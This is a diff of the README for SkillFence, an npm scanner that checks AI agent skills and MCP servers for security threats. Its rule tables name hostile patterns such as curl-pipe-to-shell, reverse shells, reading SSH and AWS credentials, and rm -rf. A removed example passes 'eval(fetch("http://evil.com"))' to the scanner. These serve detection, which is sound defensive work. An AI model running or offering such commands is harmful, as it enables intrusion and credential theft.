@@ -1,126 +1,95 @@
 # 🛡️ SkillFence
 
-**Security scanner for AI agent skills, MCP servers, and tool configs.**
+Security scanner for AI agent skills, MCP servers, and tool configs.
 
-> 43% of MCP servers have critical vulnerabilities. SkillFence catches them before your agents get pwned.
-
-[![npm version](https://img.shields.io/npm/v/skillfence)](https://www.npmjs.com/package/skillfence)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-## Why?
-
-The Model Context Protocol (MCP) ecosystem is exploding — and so are supply chain attacks. In the first 60 days of 2026, **30+ CVEs** were filed against MCP servers. Tool poisoning, prompt injection, credential theft — all hiding in skill files that agents blindly trust.
-
-SkillFence is a static analysis scanner that catches these threats before installation.
+[![npm](https://img.shields.io/npm/v/skillfence)](https://npmjs.com/package/skillfence)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
 
 ## Quick Start
 
 ```bash
-# Scan current directory
-npx skillfence scan .
-
-# Scan a specific file
-npx skillfence scan SKILL.md
-
-# Pipe content
-cat suspicious-skill.md | npx skillfence scan --stdin
-
-# JSON output for CI/CD
-npx skillfence scan . --json
+npx skillfence scan .              # Scan current directory
+npx skillfence scan SKILL.md       # Scan a file
+npx skillfence scan --stdin        # Pipe from stdin
+npx skillfence rules               # List all 76 rules
 ```
 
 ## What It Detects
 
-**35 detection rules** mapped to [OWASP MCP Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/):
+**76 detection rules** across 12 categories, mapped to [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/):
 
 | Category | Rules | Examples |
 |----------|-------|---------|
-| 🔴 Remote Code Execution | 6 | `curl \| sh`, reverse shells, encoded PowerShell |
-| 💉 Code Injection | 6 | `eval()`, `exec()`, `os.system()`, `subprocess` |
-| 🔑 Credential Access | 8 | `.ssh/`, `.aws/`, API keys, `.env` files, agent memory |
-| 📡 Data Exfiltration | 5 | IP-based URLs, base64 obfuscation, webhook services |
-| 🧠 Prompt Injection | 5 | Instruction override, role hijacking, control tokens |
-| 💥 Destructive Ops | 3 | `rm -rf /`, `chmod 777`, disk formatting |
+| 🔴 Remote Code Execution | 5 | curl pipe to shell, eval(), child_process |
+| 🎯 Prompt Injection | 5 | instruction override, role hijacking, hidden prompts |
+| 🔑 Credential Exposure | 5 | API keys, .env access, hardcoded secrets |
+| 💀 Destructive Operations | 4 | rm -rf, filesystem wipe, DROP TABLE |
+| 📤 Data Exfiltration | 6 | DNS tunneling, base64 encoding, file upload |
+| ⚡ MCP Attacks | 9 | tool poisoning, sampling abuse, forced execution, CORS |
+| 🧠 AI Safety | 8 | LangChain exploits, pickle RCE, HuggingFace code exec |
+| 🔐 Authentication | 3 | disabled auth, weak JWT, TLS bypass |
+| 📊 PII / Data Leak | 3 | password logging, token exposure, training data PII |
+| 🚫 DoS / Availability | 3 | infinite loops, rate limit bypass, token exhaustion |
+| 📦 Supply Chain | 6 | typosquatting, lifecycle scripts, unsafe-perm |
+| 💰 Crypto / Financial | 4 | wallet theft, transaction signing, token approvals |
+| 🔒 Privilege Escalation | 1 | sudo usage |
 
+## Pre-Commit Hook
+
+Block dangerous code before it's committed:
+
+```bash
+npx skillfence install-hook    # Install git pre-commit hook
 ```
-$ npx skillfence rules    # List all 35 rules with OWASP mappings
+
+Commits with CRITICAL findings are blocked. Use `git commit --no-verify` to bypass.
+
+## GitHub Action
+
+```yaml
+- uses: hhhashexe/skillfence@main
+  with:
+    path: '.'
+    fail-on: 'BLOCK'
+```
+
+## Output Formats
+
+```bash
+npx skillfence scan . --json     # JSON output for CI/CD
+npx skillfence scan . --sarif    # SARIF for GitHub Security tab
 ```
 
 ## Exit Codes
 
 | Code | Verdict | Meaning |
 |------|---------|---------|
-| `0` | ✅ CLEAN | No findings |
-| `1` | ◉ REVIEW | Low/medium findings |
-| `2` | ⚠️ WARN | High severity findings |
-| `3` | ✗ BLOCK | Critical findings — do not install |
+| 0 | CLEAN | No issues found |
+| 1 | REVIEW | Low-severity findings |
+| 2 | WARN | Medium-severity findings |
+| 3 | BLOCK | Critical issues — must fix |
 
-Perfect for CI/CD:
-
-```bash
-npx skillfence scan . --quiet || exit 1
-```
-
-## Output Formats
+## Install Globally
 
 ```bash
-skillfence scan .           # Pretty terminal output (default)
-skillfence scan . --json    # JSON (for programmatic use)
-skillfence scan . --sarif   # SARIF (for GitHub Code Scanning)
-skillfence scan . --quiet   # Just verdict + exit code
+npm install -g skillfence
+skillfence scan /path/to/project
 ```
 
-## GitHub Action
+## Zero Dependencies
 
-```yaml
-# .github/workflows/skillfence.yml
-name: SkillFence Security Scan
-on: [push, pull_request]
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-      - run: npx skillfence scan . --quiet
-```
+SkillFence has **zero npm dependencies**. Just Node.js 16+.
 
 ## API
 
-Use as a library:
+SkillFence also offers a hosted API for CI/CD integration:
 
-```javascript
-const { scanContent, scanDirectory } = require('skillfence');
-
-// Scan a string
-const result = scanContent('eval(fetch("http://evil.com"))');
-console.log(result.verdict); // "WARN"
-console.log(result.findings); // [{id: "INJ-001", severity: "HIGH", ...}]
-
-// Scan a directory
-const dirResult = scanDirectory('./my-skill');
-console.log(dirResult.totalFindings); // 3
+```bash
+curl -X POST https://your-instance/audit \
+  -H "Content-Type: application/json" \
+  -d '{"skill_content": "..."}'
 ```
-
-## Comparison
-
-| Feature | SkillFence | agent-audit | sinewave-scanner |
-|---------|-----------|-------------|-----------------|
-| Language | Node.js | Python | JavaScript |
-| Rules | 35 | 49 | ~20 |
-| OWASP mapping | ✅ | ✅ | ❌ |
-| SARIF output | ✅ | ❌ | ❌ |
-| npm/npx | ✅ | ❌ (pip) | ❌ (MCP server) |
-| Trust certificates | ✅ (API) | ❌ | ❌ |
-| Fix suggestions | ✅ | ❌ | ❌ |
-| Zero deps | ✅ | ❌ | ❌ |
-
-## Contributing
-
-Found a pattern we should detect? [Open an issue](https://github.com/hhhashexe/skillfence/issues) or submit a PR to `lib/patterns.js`.
 
 ## License
 
-MIT — [hhhashexe](https://github.com/hhhashexe)
+MIT
